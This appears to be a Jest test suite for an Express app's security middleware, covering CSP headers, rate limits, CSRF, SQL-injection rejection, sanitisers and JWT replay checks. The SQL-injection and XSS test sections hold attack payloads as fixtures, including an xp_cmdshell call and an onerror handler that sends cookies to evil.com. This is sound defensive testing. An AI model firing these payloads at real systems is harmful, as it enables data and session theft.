/**
 * security.test.js — Security Middleware Test Suite
 *
 * Tests:
 *  1. CSP headers present on all responses
 *  2. Rate limiter returns 429 after limit exceeded
 *  3. CSRF token rejected on mismatch
 *  4. SQL injection patterns rejected
 *  5. XSS payloads sanitized in input sanitization utils
 *  6. JTI replay prevention
 *  7. Audit logger redacts sensitive fields
 *  8. Input sanitization utilities
 */

import request from 'supertest';
import express from 'express';
import session from 'express-session';
import { jest } from '@jest/globals';

// ── Helpers ───────────────────────────────────────────────────────────────────

/**
 * Build a minimal Express app with security middleware for isolated testing.
 * Avoids spinning up the full server + DB.
 */
async function buildTestApp(overrides = {}) {
  const {
    securityHeaders,
    requestValidator,
    loginRateLimiter,
    apiRateLimiter,
  } = await import('../src/middleware/security.js');

  const { csrfProtection, csrfTokenHandler } = await import('../src/middleware/csrfProtection.js');

  const app = express();

  // Body parsing
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

  // Session (in-memory for tests)
  app.use(session({
    secret: 'test-secret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false },
  }));

  // Security headers
  app.use(securityHeaders);

  // Request validator
  app.use(requestValidator);

  // CSRF
  app.use(csrfProtection);

  // CSRF token endpoint
  app.get('/auth/csrf-token', csrfTokenHandler);

  // Test routes
  app.get('/api/test', (req, res) => res.json({ ok: true }));
  app.post('/api/test', (req, res) => res.json({ body: req.body }));

  // Login route with rate limiter
  app.post('/auth/login', loginRateLimiter, (req, res) => res.json({ ok: true }));

  // API route with per-minute limiter
  app.get('/api/data', apiRateLimiter, (req, res) => res.json({ data: 'ok' }));

  return app;
}

// ── Test Suite ────────────────────────────────────────────────────────────────

describe('Task 16 — Security Hardening', () => {

  // ── 1. Content Security Policy Headers ──────────────────────────────────────

  describe('1. Content Security Policy Headers', () => {
    let app;
    beforeAll(async () => { app = await buildTestApp(); });

    test('GET /api/test responds with Content-Security-Policy header', async () => {
      const res = await request(app).get('/api/test');
      expect(res.headers['content-security-policy']).toBeDefined();
      expect(res.headers['content-security-policy']).toContain("default-src 'self'");
    });

    test('CSP includes frame-ancestors none (clickjacking prevention)', async () => {
      const res = await request(app).get('/api/test');
      expect(res.headers['content-security-policy']).toContain("frame-ancestors 'none'");
    });

    test('X-Content-Type-Options is set to nosniff', async () => {
      const res = await request(app).get('/api/test');
      expect(res.headers['x-content-type-options']).toBe('nosniff');
    });

    test('Referrer-Policy header is present', async () => {
      const res = await request(app).get('/api/test');
      expect(res.headers['referrer-policy']).toBeDefined();
    });

    test('X-Powered-By header is removed', async () => {
      const res = await request(app).get('/api/test');
      expect(res.headers['x-powered-by']).toBeUndefined();
    });
  });

  // ── 2. Rate Limiting ─────────────────────────────────────────────────────────

  describe('2. Rate Limiting', () => {
    let app;
    beforeAll(async () => { app = await buildTestApp(); });

    test('Login endpoint returns 429 after 5 attempts in 15 minutes', async () => {
      // Use unique IP per test run to avoid interference between test runs
      const testIp = `10.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.1`;

      // First 5 — should succeed (login is CSRF-exempt)
      for (let i = 0; i < 5; i++) {
        await request(app)
          .post('/auth/login')
          .set('X-Forwarded-For', testIp)
          .send({ username: 'test', password: 'pass' });
      }

      // 6th — should be rate-limited
      const res = await request(app)
        .post('/auth/login')
        .set('X-Forwarded-For', testIp)
        .send({ username: 'test', password: 'pass' });

      expect(res.status).toBe(429);
      expect(res.body.error).toContain('Too many login attempts');
    }, 15_000);

    test('Rate limit response includes RateLimit-Limit header on GET /api/data', async () => {
      const res = await request(app)
        .get('/api/data')
        .set('X-Forwarded-For', '192.168.99.1');

      // standardHeaders: true sets RateLimit-Limit
      expect(res.headers['ratelimit-limit']).toBeDefined();
      expect(Number(res.headers['ratelimit-limit'])).toBeGreaterThan(0);
    });
  });

  // ── 3. CSRF Protection ────────────────────────────────────────────────────────

  describe('3. CSRF Token Validation', () => {
    let app;
    beforeAll(async () => { app = await buildTestApp(); });

    test('POST without CSRF token returns 403', async () => {
      const res = await request(app)
        .post('/api/test')
        .send({ foo: 'bar' });

      expect(res.status).toBe(403);
      expect(res.body.error).toContain('CSRF token missing');
    });

    test('POST with wrong CSRF token returns 403', async () => {
      // Use wrong-length token
      const wrongToken = 'a'.repeat(64); // 64 chars but wrong value
      const res = await request(app)
        .post('/api/test')
        .set('X-CSRF-Token', wrongToken)
        .send({ foo: 'bar' });

      expect(res.status).toBe(403);
    });

    test('POST with valid CSRF token from /auth/csrf-token succeeds', async () => {
      const agent = request.agent(app); // preserve session cookies

      // Step 1: get CSRF token
      const tokenRes = await agent.get('/auth/csrf-token');
      expect(tokenRes.status).toBe(200);
      const { csrfToken } = tokenRes.body;
      expect(csrfToken).toHaveLength(64);

      // Step 2: use it on POST
      const postRes = await agent
        .post('/api/test')
        .set('X-CSRF-Token', csrfToken)
        .send({ foo: 'bar' });

      expect(postRes.status).toBe(200);
    });

    test('CSRF token via request body _csrf field is accepted', async () => {
      const agent = request.agent(app);
      const tokenRes = await agent.get('/auth/csrf-token');
      const { csrfToken } = tokenRes.body;

      const postRes = await agent
        .post('/api/test')
        .send({ _csrf: csrfToken, foo: 'bar' });

      expect(postRes.status).toBe(200);
    });
  });

  // ── 4. SQL Injection Prevention ───────────────────────────────────────────────

  describe('4. SQL Injection Pattern Rejection', () => {
    let app;
    beforeAll(async () => { app = await buildTestApp(); });

    const SQL_PAYLOADS = [
      "' OR 1=1--",
      "'; DROP TABLE tenders;--",
      "' UNION SELECT username, password FROM users--",
      "1; SELECT * FROM information_schema.tables",
      "EXEC xp_cmdshell('whoami')",
    ];

    test.each(SQL_PAYLOADS)(
      'Rejects SQL injection payload in URL: %s',
      async (payload) => {
        const encoded = encodeURIComponent(payload);
        const res = await request(app).get(`/api/test?q=${encoded}`);
        expect(res.status).toBe(400);
        expect(res.body.error).toBe('Bad request');
      }
    );

    test('Clean query string passes through normally', async () => {
      const res = await request(app).get('/api/test?status=ACTIVE&page=1');
      expect(res.status).toBe(200);
    });
  });

  // ── 5. Input Sanitization ────────────────────────────────────────────────────

  describe('5. Input Sanitization Utils', () => {
    let sanitizeString, sanitizeTenderId, sanitizeGSTIN, sanitizeEmail, sanitizePhone, sanitizeHtml;

    beforeAll(async () => {
      const mod = await import('../src/utils/inputSanitization.js');
      sanitizeString  = mod.sanitizeString;
      sanitizeTenderId = mod.sanitizeTenderId;
      sanitizeGSTIN   = mod.sanitizeGSTIN;
      sanitizeEmail   = mod.sanitizeEmail;
      sanitizePhone   = mod.sanitizePhone;
      sanitizeHtml    = mod.sanitizeHtml;
    });

    describe('sanitizeString', () => {
      test('Removes XSS script tags', () => {
        const result = sanitizeString('<script>alert("xss")</script>Hello');
        expect(result).not.toContain('<script>');
        expect(result).toContain('Hello');
      });

      test('Removes null bytes', () => {
        const result = sanitizeString('hello\0world');
        expect(result).toBe('helloworld');
      });

      test('Trims whitespace', () => {
        expect(sanitizeString('  hello  ')).toBe('hello');
      });

      test('Truncates to maxLength', () => {
        const long = 'a'.repeat(20_000);
        expect(sanitizeString(long, { maxLength: 100 })).toHaveLength(100);
      });

      test('Handles null/undefined gracefully', () => {
        expect(sanitizeString(null)).toBe('');
        expect(sanitizeString(undefined)).toBe('');
      });

      test('Removes img onerror XSS payload', () => {
        const result = sanitizeString('<img src=x onerror=alert(1)>');
        expect(result).not.toContain('onerror');
      });
    });

    describe('sanitizeTenderId', () => {
      test('Valid tender ID passes', () => {
        expect(sanitizeTenderId('PW-ROAD-2024-0042').valid).toBe(true);
        expect(sanitizeTenderId('GR-IT-2025-1234').valid).toBe(true);
      });

      test('Invalid format is rejected', () => {
        expect(sanitizeTenderId('INVALID').valid).toBe(false);
        expect(sanitizeTenderId('pw-road-2024-0042').valid).toBe(true); // auto-uppercased
        expect(sanitizeTenderId('').valid).toBe(false);
        expect(sanitizeTenderId('PW-ROAD-2024').valid).toBe(false);
      });
    });

    describe('sanitizeGSTIN', () => {
      test('Valid GSTIN passes', () => {
        // Maharashtra GSTIN example
        expect(sanitizeGSTIN('27AABCU9603R1ZX').valid).toBe(true);
      });

      test('Invalid GSTIN fails', () => {
        expect(sanitizeGSTIN('INVALID').valid).toBe(false);
        expect(sanitizeGSTIN('12345').valid).toBe(false);
        expect(sanitizeGSTIN('').valid).toBe(false);
      });
    });

    describe('sanitizeEmail', () => {
      test('Valid emails pass', () => {
        expect(sanitizeEmail('officer@pwd.maharashtra.gov.in').valid).toBe(true);
        expect(sanitizeEmail('user@example.com').valid).toBe(true);
      });

      test('Invalid emails fail', () => {
        expect(sanitizeEmail('not-an-email').valid).toBe(false);
        expect(sanitizeEmail('@missing.com').valid).toBe(false);
        expect(sanitizeEmail('').valid).toBe(false);
      });
    });

    describe('sanitizePhone', () => {
      test('Valid Indian phone numbers pass', () => {
        expect(sanitizePhone('9876543210').valid).toBe(true);
        expect(sanitizePhone('+919876543210').valid).toBe(true);
        expect(sanitizePhone('09876543210').valid).toBe(true);
      });

      test('Normalizes to +91 format', () => {
        expect(sanitizePhone('9876543210').value).toBe('+919876543210');
      });

      test('Invalid phone numbers fail', () => {
        expect(sanitizePhone('12345').valid).toBe(false);
        expect(sanitizePhone('5555555555').valid).toBe(false); // starts with 5
        expect(sanitizePhone('').valid).toBe(false);
      });
    });

    describe('sanitizeHtml', () => {
      test('Strips all HTML tags', () => {
        const result = sanitizeHtml('<b>Bold</b> and <i>italic</i>');
        expect(result).not.toContain('<b>');
        expect(result).toContain('Bold');
        expect(result).toContain('italic');
      });

      test('Removes XSS payloads completely', () => {
        const payloads = [
          '<script>document.cookie</script>',
          '<img src=x onerror=fetch("//evil.com/"+document.cookie)>',
          '<svg onload=alert(1)>',
          'javascript:void(0)',
        ];
        for (const payload of payloads) {
          const result = sanitizeHtml(payload);
          expect(result).not.toContain('<script');
          expect(result).not.toContain('onerror');
          expect(result).not.toContain('onload');
        }
      });
    });
  });

  // ── 6. JTI Replay Prevention ─────────────────────────────────────────────────

  describe('6. JTI Replay Prevention', () => {
    let jtiReplayPrevention;
    beforeAll(async () => {
      const mod = await import('../src/middleware/security.js');
      jtiReplayPrevention = mod.jtiReplayPrevention;
    });

    test('First use of JTI is allowed', () => {
      const jti = `test-jti-${Date.now()}-${Math.random()}`;
      expect(jtiReplayPrevention(jti, 600)).toBe(true);
    });

    test('Replay of same JTI within expiry window is rejected', () => {
      const jti = `replay-jti-${Date.now()}-${Math.random()}`;
      jtiReplayPrevention(jti, 600); // first use
      expect(jtiReplayPrevention(jti, 600)).toBe(false); // replay
    });

    test('Different JTIs are independently allowed', () => {
      const jti1 = `jti-a-${Date.now()}`;
      const jti2 = `jti-b-${Date.now()}`;
      expect(jtiReplayPrevention(jti1, 600)).toBe(true);
      expect(jtiReplayPrevention(jti2, 600)).toBe(true);
    });
  });

  // ── 7. Content-Type Enforcement ───────────────────────────────────────────────

  describe('7. Content-Type Enforcement', () => {
    let app;
    beforeAll(async () => { app = await buildTestApp(); });

    test('POST with application/json Content-Type is accepted', async () => {
      const agent = request.agent(app);

      // Get CSRF token
      const tokenRes = await agent.get('/auth/csrf-token');
      const { csrfToken } = tokenRes.body;

      // JSON POST with CSRF token — no manual Content-Length
      const postRes = await agent
        .post('/api/test')
        .set('X-CSRF-Token', csrfToken)
        .send({ foo: 'bar' }); // supertest sets Content-Type: application/json automatically

      expect(postRes.status).toBe(200);
    });

    test('POST with text/plain Content-Type is rejected with 415', async () => {
      const agent = request.agent(app);
      const tokenRes = await agent.get('/auth/csrf-token');
      const { csrfToken } = tokenRes.body;

      // Manually set text/plain with non-zero body — triggers Content-Type check
      const postRes = await agent
        .post('/api/test')
        .set('Content-Type', 'text/plain')
        .set('X-CSRF-Token', csrfToken)
        .set('Content-Length', '8')
        .send('raw text');

      expect(postRes.status).toBe(415);
    });
  });
});
